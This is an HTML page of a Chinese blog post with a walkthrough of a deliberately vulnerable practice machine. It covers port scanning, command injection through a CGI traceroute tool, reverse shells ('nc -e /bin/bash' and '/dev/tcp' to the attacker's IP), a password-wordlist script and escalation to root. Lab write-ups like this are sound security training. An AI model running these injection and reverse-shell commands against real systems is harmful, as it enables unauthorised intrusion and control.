@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="靶机渗透," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="信息收集IP1192.168.1.163 端口12345678PORT     STATE SERVICE         VERSION21/tcp   open  ftp             vsftpd 3.0.322/tcp   open  ssh?80/tcp   open  http            Apache httpd 2.4.27 ((Fedora))9090/tcp">
+<meta name="keywords" content="靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透_rickdicul">
+<meta property="og:url" content="http://eagerseven.cn/2018/12/31/靶机渗透-rickdicul/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="信息收集IP1192.168.1.163 端口12345678PORT     STATE SERVICE         VERSION21/tcp   open  ftp             vsftpd 3.0.322/tcp   open  ssh?80/tcp   open  http            Apache httpd 2.4.27 ((Fedora))9090/tcp">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwqj0d0mpvj30cv045mx6.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwqj35ksghj30g4028mx7.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqo0ruw99j30j702raa5.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwqjlparj2j30ev077js0.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwqjnjjj65j305g00lmwz.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqmnx071jj30gk02haa5.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqncjc4hij308q014jrc.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqn54t1ztj309c03g0sv.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwqn6m5gpyj307k05hq2z.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/30/5bd87eee4d739.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/30/5bd87f214e8f6.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/30/5bd87fb175d7f.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/30/5bd87fdba088c.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/31/5bd8818fa3b1a.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwrj1hguuij30ay09i0t0.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwrj1n9oo0j308g03kt91.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwrj1b5pn1j30eo02gaa9.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwrmoevkttj30n904wtd5.jpg">
+<meta property="og:updated_time" content="2018-12-31T08:11:16.140Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="靶机渗透_rickdicul">
+<meta name="twitter:description" content="信息收集IP1192.168.1.163 端口12345678PORT     STATE SERVICE         VERSION21/tcp   open  ftp             vsftpd 3.0.322/tcp   open  ssh?80/tcp   open  http            Apache httpd 2.4.27 ((Fedora))9090/tcp">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwqj0d0mpvj30cv045mx6.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/12/31/靶机渗透-rickdicul/"/>
+
+
+
+
+
+  <title>靶机渗透_rickdicul | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/12/31/靶机渗透-rickdicul/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">靶机渗透_rickdicul</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-31T16:11:00+08:00">
+                2018-12-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1,490
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.163</span><br></pre></td></tr></table></figure>
+<h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">21/tcp   open  ftp             vsftpd 3.0.3</span><br><span class="line">22/tcp   open  ssh?</span><br><span class="line">80/tcp   open  http            Apache httpd 2.4.27 ((Fedora))</span><br><span class="line">9090/tcp open  ssl/zeus-admin?</span><br><span class="line">13337/tcp open  tcpwrapped</span><br><span class="line">22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)</span><br><span class="line">60000/tcp open  tcpwrapped</span><br></pre></td></tr></table></figure>
+<h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 14.04.5 LTS (GNU/Linux\SF: 4.4.0-31-generic\ x86_64</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问就一张图片，右键源码也没发现什么有价值的东西，除了一个用户名<code>MORTY</code></p>
+<p>扫目录发现一个robots.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">They&apos;re Robots Morty! It&apos;s ok to shoot them! They&apos;re just Robots!</span><br><span class="line"></span><br><span class="line">/cgi-bin/root_shell.cgi</span><br><span class="line">/cgi-bin/tracertool.cgi</span><br><span class="line">/cgi-bin/*</span><br></pre></td></tr></table></figure>
+<p>第一个访问显示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--UNDER CONSTRUCTION--</span><br></pre></td></tr></table></figure>
+<p>第二个访问是执行trace命令的组件</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwqj0d0mpvj30cv045mx6.jpg" alt=""></p>
+<p>第三个404</p>
+<p>看样子利用点应该在第二个目录，当构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+<p>的时候，列出了当前目录文件，任意命令执行！</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwqj35ksghj30g4028mx7.jpg" alt=""></p>
+<p>试试反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;bash -i &gt;&amp; /dev/tcp/192.168.1.179/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>测试发现并没有反弹shell，nc反弹成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;nc -e /bin/bash 192.168.1.179 4444</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqo0ruw99j30j702raa5.jpg" alt=""></p>
+<p>但是这里利用python调用本地bash失败了，就将就用吧</p>
+<p>但是读取<code>tracertool.cgi</code>和<code>root_shell.cgi</code>这两个文件都是猫的样子，猜测应该是每次读取文件输出行数有限制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                        _</span><br><span class="line">                       | \</span><br><span class="line">                       | |</span><br><span class="line">                       | |</span><br><span class="line">  |\                   | |</span><br><span class="line"> /, ~\                / /</span><br><span class="line">X     `-.....-------./ /</span><br><span class="line"> ~-. ~  ~              |</span><br><span class="line">    \             /    |</span><br><span class="line">     \  /_     ___\   /</span><br><span class="line">     | /\ ~~~~~   \  |</span><br><span class="line">     | | \        || |</span><br><span class="line">     | |\ \       || )</span><br><span class="line">    (_/ (_/      ((_/</span><br></pre></td></tr></table></figure>
+<p>发现不止读这两个文件，读一些敏感文件也是这样</p>
+<p>那看来不是限制行数了，可以利用more绕过，但是尝试后发现more命令没有回显，解决方案是要么在浏览器端执行这个命令，或者利用nl命令</p>
+<p>手动读取到html目录下存在一个passwords文件夹</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwqjlparj2j30ev077js0.jpg" alt=""></p>
+<p>拿到一个flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Yeah d- just don&apos;t do it.&#125; - 10 Points</span><br></pre></td></tr></table></figure>
+<p>passwords.html下的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wow Morty real clever. Storing passwords in a file called passwords.html? You&apos;ve really done it this time Morty. Let me at least hide them.. I&apos;d delete them entirely but I know you&apos;d go bitching to your mom. That&apos;s the last thing I need.</span><br></pre></td></tr></table></figure>
+<p>但是其右键源码有个一个密码</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwqjnjjj65j305g00lmwz.jpg" alt=""></p>
+<p>想读html的上层目录，读取不了了，有限制，看来这个密码有用处</p>
+<h4 id="9090端口"><a href="#9090端口" class="headerlink" title="9090端口"></a>9090端口</h4><p>访问拿到一个flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG &#123;THERE IS NO ZEUS, IN YOUR FACE!&#125; - 10 POINTS</span><br></pre></td></tr></table></figure>
+<p>这是一个登录页面，但是不能输入密码，没有登录按钮，到时收获一个server<code>localhost/localdomain</code></p>
+<p>先放一放</p>
+<h4 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h4><p>发现ftp服务器可以匿名登录，利用filezilla登录</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqmnx071jj30gk02haa5.jpg" alt=""></p>
+<p>拿到一个flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Whoa this is unexpected&#125; - 10 Points</span><br></pre></td></tr></table></figure>
+<h4 id="13337端口"><a href="#13337端口" class="headerlink" title="13337端口"></a>13337端口</h4><p>tcpwrapped服务，尝试用nc链接</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqncjc4hij308q014jrc.jpg" alt=""></p>
+<h4 id="60000端口"><a href="#60000端口" class="headerlink" title="60000端口"></a>60000端口</h4><p>同样尝试利用nc链接，发现这是一个后门啊</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwqn54t1ztj309c03g0sv.jpg" alt=""></p>
+<p>这个还可以执行命令，但是好像只能执行几个命令</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwqn6m5gpyj307k05hq2z.jpg" alt=""></p>
+<p>逃逸不了卧槽试了好久</p>
+<p>就剩22和22222端口，但是22端口好像不是一个ssh服务，22222才是，我用上面得到的密码加网站首页的用户名登录，发现不行</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先查看下用户</p>
+<p><img src="https://i.loli.net/2018/10/30/5bd87eee4d739.jpg" alt=""></p>
+<p>注意到这个Summer用户，查看当前用户进程</p>
+<p><img src="https://i.loli.net/2018/10/30/5bd87f214e8f6.jpg" alt=""></p>
+<p>查看当前用户文件</p>
+<p><img src="https://i.loli.net/2018/10/30/5bd87fb175d7f.jpg" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/30/5bd87fdba088c.jpg" alt=""></p>
+<p>有点意思，原来已经帮我们准备好了，运行看看</p>
+<p>但是运行发现没有反应，这是什么操作，算了先放一放吧</p>
+<p>上面提到的Summer用户的密码说不定就是之前的那个winter，ssh登录试试</p>
+<p><img src="https://i.loli.net/2018/10/31/5bd8818fa3b1a.jpg" alt=""></p>
+<p>成功拿到一个flag</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwrj1hguuij30ay09i0t0.jpg" alt=""></p>
+<p>home目录下还有两个用户，用户目录下有东西</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwrj1n9oo0j308g03kt91.jpg" alt=""></p>
+<p>都发到本地看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp /sbin/raw_vs_isi/hint.pcapng 用户名@IP:/路径/</span><br></pre></td></tr></table></figure>
+<p>但是发送RickSanchez用户目录下的文件时，报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThisDoesntContainAnyFlags: not a regular file</span><br></pre></td></tr></table></figure>
+<p>原因是没有权限，加个-r参数解决</p>
+<p>首先查看<code>Safe_Password.jpg</code>文件，用ihex打开拿到journal.txt.zip的密码</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwrj1b5pn1j30eo02gaa9.jpg" alt=""></p>
+<p>打开journal.txt，拿到一些信息和flag，还有safe文件的密码，下面用得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?</span><br><span class="line"></span><br><span class="line">Anyway. Here it is:</span><br><span class="line"></span><br><span class="line">FLAG: &#123;131333&#125; - 20 Points</span><br></pre></td></tr></table></figure>
+<p>再看RICKS_SAFE文件夹下，ThisDoesntContainAnyFlags文件夹下有一个txt文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hhHHAaaaAAGgGAh. You totally fell for it... Classiiiigihhic.</span><br><span class="line">But seriously this isn&apos;t a flag..</span><br></pre></td></tr></table></figure>
+<p>还有有一个可执行文件，但是执行报错，估计要在目标机器上执行才行</p>
+<p>但是还是报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!</span><br></pre></td></tr></table></figure>
+<p>加上刚刚拿到的密码，这次显示权限不足，把这个文件拷贝到Summer文件夹下就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">decrypt: 	FLAG&#123;And Awwwaaaaayyyy we Go!&#125; - 20 Points</span><br><span class="line"></span><br><span class="line">Ricks password hints:</span><br><span class="line"> (This is incase I forget.. I just hope I don&apos;t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)</span><br><span class="line">Follow these clues, in order</span><br><span class="line"></span><br><span class="line">1 uppercase character</span><br><span class="line">1 digit</span><br><span class="line">One of the words in my old bands name.�	@</span><br></pre></td></tr></table></figure>
+<p>Ricks密码的组成由以下部分</p>
+<ul>
+<li>一个大写字母，猜测在开头</li>
+<li>一个数字</li>
+<li>但是他喜欢的乐队是什么，试试关键字搜索，用已知的三个用户名搜下，拿到乐队名<code>The Flesh Curtains</code></li>
+</ul>
+<p>写个脚本生成下字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">fo = open(<span class="string">"pass.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">l = [<span class="string">'The'</span>, <span class="string">'Flesh'</span>, <span class="string">'Curtains'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        j = str(j)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> l:</span><br><span class="line">            fo.write(chr(i) + j + k)</span><br><span class="line">            fo.write(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
+<p>爆破得到RickSanchez的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P7Curtains</span><br></pre></td></tr></table></figure>
+<p>成功提权到RickSanchez，看看此用户能以root权限执行哪些命令</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwrmoevkttj30n904wtd5.jpg" alt=""></p>
+<p>所有？？？？意思是可以直接提权到root么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su -</span><br></pre></td></tr></table></figure>
+<p> 密码一样的，成功拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1	FLAG: &#123;Ionic Defibrillator&#125; - 30 points</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><ul>
+<li>robots.txt发现漏洞目录getshell</li>
+<li>passwords目录下拿到summer密码，提权到summer</li>
+<li>根据提示生成字典爆破出root用户密码</li>
+</ul>
+<h4 id="学到的新东西"><a href="#学到的新东西" class="headerlink" title="学到的新东西"></a>学到的新东西</h4><ul>
+<li>cat命令不回显，可以利用nl或者more命令绕过</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/靶机渗透/" rel="tag"><i class="fa fa-tag"></i> 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/31/靶机渗透-wakada/" rel="next" title="靶机渗透_wakada">
+                <i class="fa fa-chevron-left"></i> 靶机渗透_wakada
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/31/靶机渗透-acid/" rel="prev" title="靶机渗透_acid">
+                靶机渗透_acid <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
